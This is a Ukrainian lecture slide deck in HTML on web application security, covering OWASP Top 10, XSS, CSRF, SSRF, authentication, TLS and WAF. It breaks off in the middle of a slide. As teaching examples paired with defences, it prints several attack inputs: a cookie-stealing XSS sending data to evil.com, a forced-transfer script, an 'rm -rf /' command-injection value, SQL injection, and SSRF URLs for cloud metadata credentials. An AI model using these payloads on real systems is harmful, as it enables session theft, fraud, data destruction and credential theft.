@@ -1,0 +1,955 @@
+<!doctype html>
+<html lang="uk">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Презентація: Безпека веб-застосунків</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js/dist/reveal.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js/dist/theme/black.css">
+    <script src="https://cdn.jsdelivr.net/npm/reveal.js/dist/reveal.js"></script>
+    <style>
+        .reveal h1 { font-size: 1.45em; }
+        .reveal h2 { font-size: 1.18em; color: #58a6ff; }
+        .reveal h3 { font-size: 0.9em; color: #e8b04b; margin: 0.2em 0 0.15em; }
+        .reveal ul, .reveal ol { text-align: left; }
+        .reveal li { margin-bottom: 0.1em; font-size: 1.0em; }
+        .reveal p { margin: 0.18em 0; font-size: 1.0em; }
+        .two-col { display: flex; gap: 1em; }
+        .two-col > div { flex: 1; min-width: 0; }
+        .highlight { color: #e8b04b; font-weight: bold; }
+        .tag { background: #1f6feb; border-radius: 4px; padding: 1px 5px; font-size: 0.75em; margin: 1px; display: inline-block; }
+        .tag-green { background: #238636; border-radius: 4px; padding: 1px 5px; font-size: 0.75em; margin: 1px; display: inline-block; }
+        .tag-red { background: #da3633; border-radius: 4px; padding: 1px 5px; font-size: 0.75em; margin: 1px; display: inline-block; }
+        .box { border: 1px solid #444; border-radius: 5px; padding: 0.2em 0.6em; margin: 0.15em 0; }
+        table { font-size: 0.7em; border-collapse: collapse; width: 100%; }
+        th { background: #1f6feb; padding: 3px 5px; }
+        td { padding: 3px 5px; border-bottom: 1px solid #444; }
+        code { background: #161b22; padding: 1px 4px; border-radius: 4px; font-size: 0.88em; color: #58a6ff; }
+        pre code { display: block; padding: 0.4em; font-size: 0.8em; color: #c9d1d9; line-height: 1.25; white-space: pre; }
+        /* Allow slide content to scroll vertically when it overflows */
+        .reveal .slides section {
+            overflow-y: auto !important;
+            max-height: 100% !important;
+            box-sizing: border-box !important;
+        }
+    </style>
+</head>
+<body>
+    <div class="reveal">
+        <div class="slides">
+
+            <!-- ===== СЛАЙД 1: Титульний ===== -->
+            <section>
+                <h1>Безпека веб-застосунків</h1>
+                <h2 style="color:#e8b04b;">Web Application Security</h2>
+                <p>Лекція 7 &nbsp;|&nbsp; Курс: Інформаційна безпека хмарних технологій</p>
+                <hr style="border-color:#444; margin:1em 0;">
+                <p style="font-size:0.78em;">OWASP Top 10 &nbsp;·&nbsp; API Security &nbsp;·&nbsp; Telecom Web &nbsp;·&nbsp; AWS WAF &amp; Shield</p>
+                <p style="font-size:0.75em; color:#888; margin-top:0.6em;">Модуль 2: Захист сервісів, інциденти та відповідність</p>
+            </section>
+
+            <!-- ===== СЛАЙД 2: План лекції ===== -->
+            <section>
+                <h2>План лекції</h2>
+                <div class="two-col">
+                    <div>
+                        <h3>🌐 Частина 1: Безпека веб-застосунків</h3>
+                        <ol style="font-size:0.82em;">
+                            <li>Ландшафт загроз та OWASP Top 10</li>
+                            <li>Ін'єкції: SQL, Command, LDAP</li>
+                            <li>XSS, CSRF, SSRF, IDOR</li>
+                            <li>Аутентифікація та управління сесіями</li>
+                            <li>API Security — OWASP API Top 10</li>
+                            <li>HTTPS/TLS, WAF, Security Headers</li>
+                            <li>OAuth 2.0, JWT, OpenID Connect</li>
+                            <li>Secure SDLC, DevSecOps, інструменти</li>
+                        </ol>
+                    </div>
+                    <div>
+                        <h3>📡 Частина 2: Телеком веб-застосунки</h3>
+                        <ol style="font-size:0.82em;" start="9">
+                            <li>VoIP/SIP — протоколи та вразливості</li>
+                            <li>5G SBA та RESTful NF-інтерфейси</li>
+                            <li>Telecom API: NEF, CAMARA</li>
+                            <li>SS7/Diameter — legacy загрози</li>
+                            <li>Mobile Apps — OWASP Mobile Top 10</li>
+                            <li>AWS API Gateway — захист та авторизація</li>
+                        </ol>
+                        <h3 style="margin-top:0.5em;">☁️ Частина 3: Cloud/DevSecOps</h3>
+                        <ol style="font-size:0.82em;" start="15">
+                            <li>AWS WAF, Shield, CloudFront</li>
+                            <li>DevSecOps Pipeline в AWS</li>
+                            <li>PCI DSS, GDPR, ISO 27034</li>
+                        </ol>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ===== СЛАЙД 3: Ландшафт загроз веб ===== -->
+            <section>
+                <h2>Безпека веб-застосунків — ландшафт загроз</h2>
+                <div class="two-col">
+                    <div>
+                        <h3>📊 Статистика атак (2024)</h3>
+                        <table>
+                            <thead><tr><th>Тип атаки</th><th>Частка інцидентів</th></tr></thead>
+                            <tbody>
+                                <tr><td>Injection (SQL, XSS…)</td><td><span class="tag-red">32%</span></td></tr>
+                                <tr><td>Broken Auth / Session</td><td><span class="tag-red">18%</span></td></tr>
+                                <tr><td>API abuse</td><td><span class="tag-red">21%</span></td></tr>
+                                <tr><td>DDoS на веб-рівень</td><td><span class="tag">16%</span></td></tr>
+                                <tr><td>Supply chain / 3rd-party</td><td><span class="tag">13%</span></td></tr>
+                            </tbody>
+                        </table>
+                        <div class="box" style="margin-top:0.4em; font-size:0.75em; border-color:#da3633;">
+                            ⚠️ <strong>Verizon DBIR 2024:</strong> 43% зламів пов'язані з веб-застосунками. Середня вартість інциденту — $4.45 млн (IBM).
+                        </div>
+                    </div>
+                    <div>
+                        <h3>🎯 Поверхня атаки веб-застосунку</h3>
+                        <ul style="font-size:0.82em;">
+                            <li><span class="highlight">Вхідні дані</span> — форми, URL-параметри, заголовки HTTP, cookies</li>
+                            <li><span class="highlight">API endpoints</span> — REST, GraphQL, SOAP, WebSocket</li>
+                            <li><span class="highlight">Залежності</span> — npm/pip/Maven пакети, 3rd-party JS</li>
+                            <li><span class="highlight">Автентифікація</span> — логін, реєстрація, відновлення паролю</li>
+                            <li><span class="highlight">Завантаження файлів</span> — тип, розмір, вміст</li>
+                            <li><span class="highlight">Конфігурація</span> — заголовки, CORS, помилки (stack trace)</li>
+                            <li><span class="highlight">Серверна інфраструктура</span> — ОС, веб-сервер, бази даних</li>
+                        </ul>
+                        <div class="box" style="font-size:0.75em; margin-top:0.3em; border-color:#1f6feb;">
+                            🌐 <strong>Телеком-специфіка:</strong> BSS/OSS-портали, OAM-інтерфейси, SIP-over-WebSocket, 5G NF REST API — розширена поверхня атаки
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ===== СЛАЙД 4: OWASP Top 10 (2021) ===== -->
+            <section>
+                <h2>OWASP Top 10 (2021) — огляд</h2>
+                <table>
+                    <thead>
+                        <tr><th>#</th><th>Вразливість</th><th>Ризик</th><th>Приклад</th></tr>
+                    </thead>
+                    <tbody>
+                        <tr><td><span class="tag-red">A01</span></td><td>Broken Access Control</td><td>🔴 Критичний</td><td>Доступ до чужих даних через зміну ID</td></tr>
+                        <tr><td><span class="tag-red">A02</span></td><td>Cryptographic Failures</td><td>🔴 Критичний</td><td>Пароль у MD5, HTTP замість HTTPS</td></tr>
+                        <tr><td><span class="tag-red">A03</span></td><td>Injection</td><td>🔴 Критичний</td><td>SQL Injection, Command Injection, XSS</td></tr>
+                        <tr><td><span class="tag">A04</span></td><td>Insecure Design</td><td>🟠 Високий</td><td>Відсутність rate limiting на логін</td></tr>
+                        <tr><td><span class="tag">A05</span></td><td>Security Misconfiguration</td><td>🟠 Високий</td><td>Дефолтні паролі, відкритий S3</td></tr>
+                        <tr><td><span class="tag">A06</span></td><td>Vulnerable Components</td><td>🟠 Високий</td><td>Log4Shell, outdated jQuery</td></tr>
+                        <tr><td><span class="tag">A07</span></td><td>Auth &amp; Session Failures</td><td>🟠 Високий</td><td>Слабкі токени, відсутність MFA</td></tr>
+                        <tr><td><span class="tag">A08</span></td><td>Software &amp; Data Integrity</td><td>🟡 Середній</td><td>Ненадійні CDN, unsigned updates</td></tr>
+                        <tr><td><span class="tag">A09</span></td><td>Logging &amp; Monitoring Failures</td><td>🟡 Середній</td><td>Немає алертів на brute force</td></tr>
+                        <tr><td><span class="tag">A10</span></td><td>SSRF</td><td>🟠 Високий</td><td>Запит до 169.254.169.254 (IMDS)</td></tr>
+                    </tbody>
+                </table>
+                <p style="font-size:0.68em; color:#888; margin-top:0.3em;">Джерело: OWASP Top 10 — 2021. owasp.org/Top10/</p>
+            </section>
+
+            <!-- ===== СЛАЙД 5: A01 Broken Access Control / IDOR ===== -->
+            <section>
+                <h2>A01: Broken Access Control та IDOR</h2>
+                <div class="two-col">
+                    <div>
+                        <h3>🔓 Broken Access Control</h3>
+                        <ul style="font-size:0.8em;">
+                            <li>Порушення принципу <span class="highlight">найменших привілеїв</span></li>
+                            <li>Обхід перевірки прав через маніпуляцію URL або параметрами</li>
+                            <li>Перегляд або редагування чужих записів</li>
+                            <li>Підвищення привілеїв (user → admin)</li>
+                            <li>Відсутність перевірки прав на рівні API</li>
+                        </ul>
+                        <h3 style="margin-top:0.4em;">🆔 IDOR (Insecure Direct Object Reference)</h3>
+                        <pre><code># Вразливий endpoint:
+GET /api/invoices/1042      # твій рахунок
+GET /api/invoices/1041      # чужий рахунок ← IDOR!
+
+# Захищений:
+GET /api/invoices/1041
+→ 403 Forbidden (перевірка власника)</code></pre>
+                    </div>
+                    <div>
+                        <h3>🛡️ Захист від Broken Access Control</h3>
+                        <ul style="font-size:0.8em;">
+                            <li>Перевірка прав доступу на <span class="highlight">кожному</span> backend-запиті</li>
+                            <li>Deny by default — заборонено все, що явно не дозволено</li>
+                            <li>RBAC (Role-Based Access Control) або ABAC</li>
+                            <li>Непередбачувані ідентифікатори (UUID замість sequential ID)</li>
+                            <li>Централізована логіка авторизації</li>
+                            <li>Автоматизовані тести для перевірки прав</li>
+                        </ul>
+                        <div class="box" style="font-size:0.75em; margin-top:0.3em; border-color:#238636;">
+                            ✅ <strong>AWS:</strong> IAM + Resource Policies + Cognito Groups для RBAC у хмарних застосунках
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ===== СЛАЙД 6: A03 Injection ===== -->
+            <section>
+                <h2>A03: Ін'єкції — SQL, Command, LDAP</h2>
+                <div class="two-col">
+                    <div>
+                        <h3>💉 SQL Injection</h3>
+                        <pre><code># Вразливий запит (Python):
+query = "SELECT * FROM users WHERE
+  login='" + username + "'"
+
+# Атака:
+username = "admin'--"
+# Виконується: SELECT * FROM users
+#   WHERE login='admin'--'
+
+# Захист — параметризований запит:
+cursor.execute(
+  "SELECT * FROM users WHERE login=?",
+  (username,)
+)</code></pre>
+                        <h3 style="margin-top:0.3em;">⚙️ Command Injection</h3>
+                        <pre><code># Вразливо:
+os.system("ping " + user_input)
+# Атака: user_input = "8.8.8.8; rm -rf /"
+
+# Захист: subprocess + список аргументів
+subprocess.run(["ping", "-c", "1", ip],
+               check=True)</code></pre>
+                    </div>
+                    <div>
+                        <h3>🛡️ Захист від ін'єкцій</h3>
+                        <ul style="font-size:0.8em;">
+                            <li><span class="highlight">Параметризовані запити</span> — ніколи не конкатенувати рядки</li>
+                            <li><span class="highlight">ORM</span> — SQLAlchemy, Hibernate, ActiveRecord</li>
+                            <li><span class="highlight">Валідація вхідних даних</span> — whitelist, а не blacklist</li>
+                            <li><span class="highlight">Мінімальні права БД</span> — окремий user з SELECT/INSERT</li>
+                            <li><span class="highlight">WAF</span> — блокування типових payload</li>
+                            <li><span class="highlight">Escaping</span> — для HTML, JS, SQL, LDAP окремо</li>
+                        </ul>
+                        <table style="margin-top:0.3em;">
+                            <thead><tr><th>Тип</th><th>Контекст</th><th>Захист</th></tr></thead>
+                            <tbody>
+                                <tr><td>SQL Injection</td><td>БД-запити</td><td>Prepared statements</td></tr>
+                                <tr><td>LDAP Injection</td><td>AD/LDAP</td><td>LDAP escaping</td></tr>
+                                <tr><td>Command Injection</td><td>Shell</td><td>subprocess list args</td></tr>
+                                <tr><td>XPath Injection</td><td>XML</td><td>Parameterized XPath</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ===== СЛАЙД 7: A02 Cryptographic Failures ===== -->
+            <section>
+                <h2>A02: Cryptographic Failures</h2>
+                <div class="two-col">
+                    <div>
+                        <h3>⚠️ Типові помилки криптографії</h3>
+                        <ul style="font-size:0.82em;">
+                            <li>Передача чутливих даних по <span class="tag-red">HTTP</span> (не HTTPS)</li>
+                            <li>Зберігання паролів у <span class="tag-red">MD5</span> або <span class="tag-red">SHA-1</span></li>
+                            <li>Слабкий або відсутній <span class="tag-red">IV/nonce</span> для симетричного шифру</li>
+                            <li>Хардкодовані ключі та паролі у вихідному коді</li>
+                            <li>Відключена перевірка SSL-сертифікатів (<code>verify=False</code>)</li>
+                            <li>Використання застарілих алгоритмів: <span class="tag-red">DES</span>, <span class="tag-red">RC4</span>, <span class="tag-red">ECB</span></li>
+                        </ul>
+                        <div class="box" style="border-color:#da3633; font-size:0.75em; margin-top:0.3em;">
+                            💥 <strong>Приклад:</strong> LinkedIn (2012) — 6.5 млн паролів у MD5 (без salt) зламані за години після витоку
+                        </div>
+                    </div>
+                    <div>
+                        <h3>✅ Правильне хешування паролів</h3>
+                        <pre><code># ❌ Неправильно:
+import hashlib
+h = hashlib.md5(password.encode()).hexdigest()
+
+# ✅ Правильно (Python):
+import bcrypt
+hashed = bcrypt.hashpw(
+    password.encode(),
+    bcrypt.gensalt(rounds=12)
+)
+# Або argon2:
+from argon2 import PasswordHasher
+ph = PasswordHasher()
+hash = ph.hash(password)</code></pre>
+                        <div class="box" style="font-size:0.75em; margin-top:0.3em; border-color:#238636;">
+                            ✅ <strong>Рекомендовані алгоритми:</strong><br>
+                            Паролі: <span class="tag-green">bcrypt</span> <span class="tag-green">Argon2id</span> <span class="tag-green">scrypt</span><br>
+                            Шифрування: <span class="tag-green">AES-256-GCM</span> <span class="tag-green">ChaCha20-Poly1305</span><br>
+                            TLS: <span class="tag-green">1.2+</span>, краще <span class="tag-green">1.3</span>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ===== СЛАЙД 8: A07 XSS ===== -->
+            <section>
+                <h2>A07: XSS — Cross-Site Scripting</h2>
+                <div class="two-col">
+                    <div>
+                        <h3>🎭 Типи XSS-атак</h3>
+                        <div class="box" style="border-color:#da3633; font-size:0.78em;">
+                            <strong style="color:#da3633;">Reflected XSS</strong> — шкідливий скрипт у запиті, відображається у відповіді<br>
+                            <code>https://site.com/search?q=&lt;script&gt;document.location='evil.com?c='+document.cookie&lt;/script&gt;</code>
+                        </div>
+                        <div class="box" style="border-color:#da3633; font-size:0.78em; margin-top:0.3em;">
+                            <strong style="color:#da3633;">Stored XSS</strong> — скрипт зберігається в БД і виконується у всіх відвідувачів<br>
+                            <code>&lt;script&gt;fetch('/transfer',{method:'POST',body:'to=attacker&amp;amount=1000'})&lt;/script&gt;</code>
+                        </div>
+                        <div class="box" style="border-color:#e8b04b; font-size:0.78em; margin-top:0.3em;">
+                            <strong style="color:#e8b04b;">DOM XSS</strong> — маніпуляція DOM на стороні клієнта без взаємодії з сервером<br>
+                            Вразливо: <code>document.innerHTML = location.hash</code>
+                        </div>
+                    </div>
+                    <div>
+                        <h3>🛡️ Захист від XSS</h3>
+                        <ul style="font-size:0.8em;">
+                            <li><span class="highlight">Output encoding</span> — HTML-entities при виведенні даних у HTML</li>
+                            <li><span class="highlight">Content Security Policy (CSP)</span> — заборона inline-скриптів</li>
+                            <li><span class="highlight">HTTPOnly cookie</span> — JS не може читати session cookie</li>
+                            <li><span class="highlight">X-XSS-Protection: 1; mode=block</span></li>
+                            <li><span class="highlight">Використовуйте фреймворк</span> — React, Vue auto-escape</li>
+                            <li>Уникати <code>innerHTML</code>, <code>document.write</code>, <code>eval()</code></li>
+                            <li>DOMPurify для sanitization HTML-вмісту</li>
+                        </ul>
+                        <pre><code>// CSP заголовок:
+Content-Security-Policy:
+  default-src 'self';
+  script-src 'self' 'nonce-{random}';
+  style-src 'self';
+  img-src 'self' data:;
+  object-src 'none'</code></pre>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ===== СЛАЙД 9: CSRF ===== -->
+            <section>
+                <h2>CSRF — Cross-Site Request Forgery</h2>
+                <div class="two-col">
+                    <div>
+                        <h3>⚔️ Як працює CSRF-атака</h3>
+                        <div class="box" style="border-color:#da3633; font-size:0.8em;">
+                            <ol style="font-size:0.95em;">
+                                <li>Жертва автентифікується на <code>bank.com</code></li>
+                                <li>Браузер зберігає session cookie</li>
+                                <li>Жертва відвідує шкідливий сайт <code>evil.com</code></li>
+                                <li>На <code>evil.com</code> — прихована форма або img-запит:</li>
+                            </ol>
+                            <pre><code>&lt;img src="https://bank.com/transfer
+  ?to=attacker&amp;amount=10000"&gt;</code></pre>
+                            <ol start="5" style="font-size:0.95em;">
+                                <li>Браузер автоматично додає cookie → переказ виконано!</li>
+                            </ol>
+                        </div>
+                    </div>
+                    <div>
+                        <h3>🛡️ Захист від CSRF</h3>
+                        <ul style="font-size:0.82em;">
+                            <li><span class="highlight">CSRF Token</span> — унікальний токен у кожній формі, перевіряється сервером</li>
+                            <li><span class="highlight">SameSite Cookie</span>:
+                                <ul style="font-size:0.9em;">
+                                    <li><code>SameSite=Strict</code> — cookie не надсилається з інших сайтів</li>
+                                    <li><code>SameSite=Lax</code> — дозволені тільки GET-переходи</li>
+                                </ul>
+                            </li>
+                            <li><span class="highlight">Double Submit Cookie</span> — порівняння значень у cookie та параметрі</li>
+                            <li><span class="highlight">Origin / Referer перевірка</span></li>
+                            <li>Для критичних дій — повторна автентифікація</li>
+                        </ul>
+                        <pre><code># Django автоматичний захист:
+# {% csrf_token %} у кожній формі
+# MIDDLEWARE: 'django.middleware.csrf.CsrfViewMiddleware'
+
+# Cookie:
+Set-Cookie: session=abc; SameSite=Strict;
+            HttpOnly; Secure</code></pre>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ===== СЛАЙД 10: SSRF ===== -->
+            <section>
+                <h2>A10: SSRF — Server-Side Request Forgery</h2>
+                <div class="two-col">
+                    <div>
+                        <h3>🌐 Як працює SSRF</h3>
+                        <p style="font-size:0.8em;">Зловмисник змушує сервер виконати запит до внутрішнього або стороннього ресурсу</p>
+                        <pre><code># Вразливий endpoint:
+GET /fetch?url=https://example.com
+
+# Атаки через SSRF:
+# 1. AWS IMDS (metadata service):
+url=http://169.254.169.254/latest/
+    meta-data/iam/security-credentials/
+
+# 2. Внутрішні сервіси:
+url=http://internal-admin.corp:8080/admin
+
+# 3. Cloud metadata (GCP):
+url=http://metadata.google.internal/
+    computeMetadata/v1/instance/</code></pre>
+                        <div class="box" style="border-color:#da3633; font-size:0.75em;">
+                            💥 Capital One (2019): SSRF → IMDSv1 → IAM credentials → 100M записів
+                        </div>
+                    </div>
+                    <div>
+                        <h3>🛡️ Захист від SSRF</h3>
+                        <ul style="font-size:0.82em;">
+                            <li><span class="highlight">Whitelist дозволених URL</span> — лише відомі зовнішні хости</li>
+                            <li><span class="highlight">Блокування приватних діапазонів</span>: 10.x, 172.16.x, 192.168.x, 169.254.x</li>
+                            <li><span class="highlight">IMDSv2</span> — обов'язковий на EC2 (токен-сесія)</li>
+                            <li>Відключення непотрібних URL-схем (file://, gopher://)</li>
+                            <li>Мережева ізоляція backend-сервера (egress filtering)</li>
+                            <li>Перевірка DNS-розв'язування після резолвінгу (DNS rebinding)</li>
+                        </ul>
+                        <div class="box" style="font-size:0.75em; margin-top:0.3em; border-color:#238636;">
+                            ✅ <strong>AWS захист:</strong><br>
+                            — IMDSv2 (обов'язковий hop limit=1)<br>
+                            — VPC egress rules (Security Groups)<br>
+                            — AWS WAF SSRF-правила (Managed Rules)
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ===== СЛАЙД 11: Аутентифікація та управління сесіями ===== -->
+            <section>
+                <h2>Аутентифікація та управління сесіями</h2>
+                <div class="two-col">
+                    <div>
+                        <h3>⚠️ Типові вразливості (A07)</h3>
+                        <ul style="font-size:0.8em;">
+                            <li>Відсутність брутфорс-захисту (необмежені спроби)</li>
+                            <li>Слабкі паролі або дефолтні облікові записи</li>
+                            <li>Session ID у URL (витікає через Referer/логи)</li>
+                            <li>Session не інвалідується після виходу</li>
+                            <li>Занадто довгий термін дії сесії / JWT</li>
+                            <li>Відсутність MFA для привілейованих операцій</li>
+                            <li>Небезпечний "Забули пароль" (security questions)</li>
+                        </ul>
+                        <div class="box" style="border-color:#da3633; font-size:0.75em; margin-top:0.3em;">
+                            💥 <strong>Credential Stuffing:</strong> автоматичне тестування витоків паролів з інших сервісів
+                        </div>
+                    </div>
+                    <div>
+                        <h3>✅ Кращі практики аутентифікації</h3>
+                        <table>
+                            <thead><tr><th>Аспект</th><th>Рекомендація</th></tr></thead>
+                            <tbody>
+                                <tr><td>Паролі</td><td>bcrypt/Argon2, мін. 12 символів, HIBP перевірка</td></tr>
+                                <tr><td>Lockout</td><td>5 спроб → блокування + CAPTCHA</td></tr>
+                                <tr><td>MFA</td><td>TOTP (Google Auth), WebAuthn/FIDO2</td></tr>
+                                <tr><td>Session ID</td><td>128-bit random, HttpOnly, Secure, SameSite</td></tr>
+                                <tr><td>Термін сесії</td><td>15-30 хв idle timeout, absolute 8h</td></tr>
+                                <tr><td>Logout</td><td>Інвалідація на сервері (не тільки на клієнті)</td></tr>
+                                <tr><td>JWT</td><td>RS256, exp ≤ 15 хв, revocation list</td></tr>
+                            </tbody>
+                        </table>
+                        <div class="box" style="font-size:0.75em; margin-top:0.3em; border-color:#238636;">
+                            ✅ <strong>AWS Cognito:</strong> готовий Auth з MFA, TOTP, FIDO2, JWT, OAuth 2.0
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ===== СЛАЙД 12: OWASP API Security Top 10 ===== -->
+            <section>
+                <h2>OWASP API Security Top 10</h2>
+                <div class="two-col">
+                    <div>
+                        <table>
+                            <thead><tr><th>#</th><th>Вразливість API</th><th>Приклад</th></tr></thead>
+                            <tbody>
+                                <tr><td><span class="tag-red">API1</span></td><td>Broken Object Level Auth</td><td>GET /orders/{id} без перевірки власника</td></tr>
+                                <tr><td><span class="tag-red">API2</span></td><td>Broken Auth</td><td>Токени без терміну дії, слабкі ключі</td></tr>
+                                <tr><td><span class="tag-red">API3</span></td><td>Broken Object Property Auth</td><td>PATCH повертає чужі поля</td></tr>
+                                <tr><td><span class="tag">API4</span></td><td>Unrestricted Resource Consumption</td><td>Немає rate limiting → DDoS</td></tr>
+                                <tr><td><span class="tag">API5</span></td><td>Broken Function Level Auth</td><td>/api/admin доступний рядовому user</td></tr>
+                                <tr><td><span class="tag">API6</span></td><td>Unrestricted Access to Sensitive Flows</td><td>Mass registration, OTP bypass</td></tr>
+                                <tr><td><span class="tag">API7</span></td><td>SSRF (через API)</td><td>POST /fetch з URL параметром</td></tr>
+                                <tr><td><span class="tag">API8</span></td><td>Security Misconfiguration</td><td>CORS *, debug endpoints у prod</td></tr>
+                                <tr><td><span class="tag">API9</span></td><td>Improper Inventory Management</td><td>Старий /v1/ без захисту</td></tr>
+                                <tr><td><span class="tag">API10</span></td><td>Unsafe API Consumption</td><td>Довіра до відповідей 3rd-party API</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
+                    <div>
+                        <h3>🛡️ API Security — ключові принципи</h3>
+                        <ul style="font-size:0.82em;">
+                            <li><span class="highlight">Authn + Authz на кожному endpoint</span> — не лише на рівні маршрутизатора</li>
+                            <li><span class="highlight">Rate limiting</span> — по IP, по user, по endpoint</li>
+                            <li><span class="highlight">Версіонування</span> — деприкейт старих версій</li>
+                            <li><span class="highlight">Schema validation</span> — OpenAPI/JSON Schema</li>
+                            <li><span class="highlight">Мінімальна відповідь</span> — не повертати зайві поля</li>
+                            <li><span class="highlight">API Gateway</span> — централізований захист</li>
+                        </ul>
+                        <div class="box" style="font-size:0.75em; margin-top:0.4em; border-color:#1f6feb;">
+                            📡 <strong>Телеком API:</strong> NEF, CAMARA API, Diameter REST — ті ж ризики, але критичніші наслідки (зупинка послуг)
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ===== СЛАЙД 13: HTTPS та TLS ===== -->
+            <section>
+                <h2>HTTPS та TLS — транспортна безпека</h2>
+                <div class="two-col">
+                    <div>
+                        <h3>🔒 TLS Handshake (TLS 1.3)</h3>
+                        <div class="box" style="font-size:0.78em;">
+                            <p>1️⃣ <strong>ClientHello</strong> — версія, cipher suites, random</p>
+                            <p>2️⃣ <strong>ServerHello</strong> + Certificate + KeyShare</p>
+                            <p>3️⃣ <strong>Клієнт перевіряє</strong> сертифікат (CA chain, термін дії)</p>
+                            <p>4️⃣ <strong>Генерація спільного секрету</strong> (ECDHE)</p>
+                            <p>5️⃣ <strong>Шифрований канал</strong> встановлено (1-RTT)</p>
+                        </div>
+                        <h3 style="margin-top:0.4em;">📋 Рекомендований TLS конфіг</h3>
+                        <pre><code># Nginx — безпечна конфігурація:
+ssl_protocols TLSv1.2 TLSv1.3;
+ssl_ciphers ECDHE-ECDSA-AES256-GCM-SHA384:
+            ECDHE-RSA-AES256-GCM-SHA384;
+ssl_prefer_server_ciphers off;
+ssl_session_cache shared:SSL:10m;
+ssl_stapling on;</code></pre>
+                    </div>
+                    <div>
+                        <h3>⚠️ Типові проблеми TLS</h3>
+                        <table>
+                            <thead><tr><th>Проблема</th><th>Ризик</th><th>Рішення</th></tr></thead>
+                            <tbody>
+                                <tr><td>TLS 1.0/1.1</td><td>BEAST, POODLE</td><td>Вимкнути</td></tr>
+                                <tr><td>Слабкі cipher suites (RC4)</td><td>Дешифрування</td><td>Whitelist strong</td></tr>
+                                <tr><td>Self-signed cert</td><td>MITM, no trust</td><td>ACM / Let's Encrypt</td></tr>
+                                <tr><td>Протермінований сертифікат</td><td>Browser warning</td><td>Auto-renewal ACM</td></tr>
+                                <tr><td>Mixed content</td><td>Bypass HTTPS</td><td>CSP upgrade-insecure</td></tr>
+                                <tr><td>Відсутність HSTS</td><td>SSL stripping</td><td>Strict-Transport-Security</td></tr>
+                            </tbody>
+                        </table>
+                        <div class="box" style="font-size:0.75em; margin-top:0.3em; border-color:#238636;">
+                            ✅ <strong>AWS ACM:</strong> безкоштовні сертифікати, авто-оновлення, інтеграція з ALB/CloudFront/API GW
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ===== СЛАЙД 14: WAF ===== -->
+            <section>
+                <h2>WAF — Web Application Firewall</h2>
+                <div class="two-col">
+                    <div>
+                        <h3>🛡️ Що таке WAF?</h3>
+                        <p style="font-size:0.82em;">WAF аналізує HTTP/HTTPS трафік та блокує шкідливі запити <span class="highlight">до того</span>, як вони досягнуть застосунку</p>
+                        <div class="box" style="border-color:#1f6feb; font-size:0.78em; margin-top:0.3em;">
+                            <strong>Типи WAF:</strong>
+                            <ul>
+                                <li><span class="tag">Network-based</span> апаратне рішення перед DMZ</li>
+                                <li><span class="tag">Host-based</span> модуль у веб-сервері (mod_security)</li>
+                                <li><span class="tag-green">Cloud-based</span> SaaS (AWS WAF, Cloudflare, Imperva)</li>
+                            </ul>
+                        </div>
+                        <h3 style="margin-top:0.4em;">📋 Що WAF захищає</h3>
+                        <ul style="font-size:0.8em;">
+                            <li>SQL Injection, XSS, Command Injection</li>
+                            <li>OWASP Top 10 типові атаки</li>
+                            <li>Bot-трафік та scraping</li>
+                            <li>Rate limiting / Brute force</li>
+                            <li>Geo-blocking за країнами</li>
+                            <li>IP reputation blacklist</li>
+                        </ul>
+                    </div>
+                    <div>
+                        <h3>⚠️ Обмеження WAF</h3>
+                        <div class="box" style="border-color:#da3633; font-size:0.8em;">
+                            <ul>
+                                <li>WAF ≠ замінник безпечного коду</li>
+                                <li>Бізнес-логіка вразливості — WAF не бачить</li>
+                                <li>IDOR — WAF не знає чи ID "чужий"</li>
+                                <li>False positives — блокування легітимних запитів</li>
+                                <li>Обхід через кодування (URL encoding, unicode)</li>
+                            </ul>
+                        </div>
+                        <h3 style="margin-top:0.4em;">🏗️ Режими роботи WAF</h3>
+                        <table>
+                            <thead><tr><th>Режим</th><th>Дія</th><th>Коли</th></tr></thead>
+                            <tbody>
+                                <tr><td>Detection</td><td>Логує, не блокує</td><td>Початок впровадження</td></tr>
+                                <tr><td>Prevention</td><td>Блокує запити</td><td>Після налаштування</td></tr>
+                                <tr><td>Custom rules</td><td>Бізнес-логіка</td><td>Специфічні випадки</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ===== СЛАЙД 15: HTTP Security Headers та CSP ===== -->
+            <section>
+                <h2>HTTP Security Headers та Content Security Policy</h2>
+                <div class="two-col">
+                    <div>
+                        <h3>🔒 Основні Security Headers</h3>
+                        <table>
+                            <thead><tr><th>Заголовок</th><th>Призначення</th></tr></thead>
+                            <tbody>
+                                <tr><td><code>Strict-Transport-Security</code></td><td>Примусовий HTTPS (HSTS)</td></tr>
+                                <tr><td><code>Content-Security-Policy</code></td><td>Дозволені джерела ресурсів</td></tr>
+                                <tr><td><code>X-Frame-Options</code></td><td>Захист від Clickjacking</td></tr>
+                                <tr><td><code>X-Content-Type-Options</code></td><td>Заборона MIME-sniffing</td></tr>
+                                <tr><td><code>Referrer-Policy</code></td><td>Контроль Referer заголовку</td></tr>
+                                <tr><td><code>Permissions-Policy</code></td><td>Доступ до API браузера</td></tr>
+                                <tr><td><code>Cross-Origin-Opener-Policy</code></td><td>Ізоляція вкладок (Spectre)</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
+                    <div>
+                        <h3>📋 Приклади заголовків</h3>
+                        <pre><code># Nginx — безпечні заголовки:
+add_header Strict-Transport-Security
+  "max-age=31536000; includeSubDomains"
+  always;
+add_header X-Frame-Options "DENY";
+add_header X-Content-Type-Options
+  "nosniff";
+add_header Referrer-Policy
+  "strict-origin-when-cross-origin";
+add_header Content-Security-Policy
+  "default-src 'self';
